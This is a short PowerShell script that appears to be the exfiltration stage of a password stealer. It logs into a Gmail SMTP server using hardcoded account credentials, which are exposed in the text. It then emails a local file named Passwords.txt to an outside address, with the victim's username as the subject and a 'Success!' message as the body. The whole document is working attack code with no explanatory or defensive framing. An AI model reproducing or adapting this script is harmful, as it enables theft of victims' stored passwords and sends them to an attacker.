$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('baikiemtralhp2022@gmail.com', 'baikiemtra')
$E = New-Object System.Net.Mail.MailMessage
$E.From = 'baikiemtralhp2022@gmail.com'
$E.To.Add('harmx96.github@gmail.com')
$E.Subject = $env:UserName
$E.Body = 'Success! The password file is attached!'
$F = "Passwords.txt"
$E.Attachments.Add($F)
$SMTPInfo.Send($E)
exit
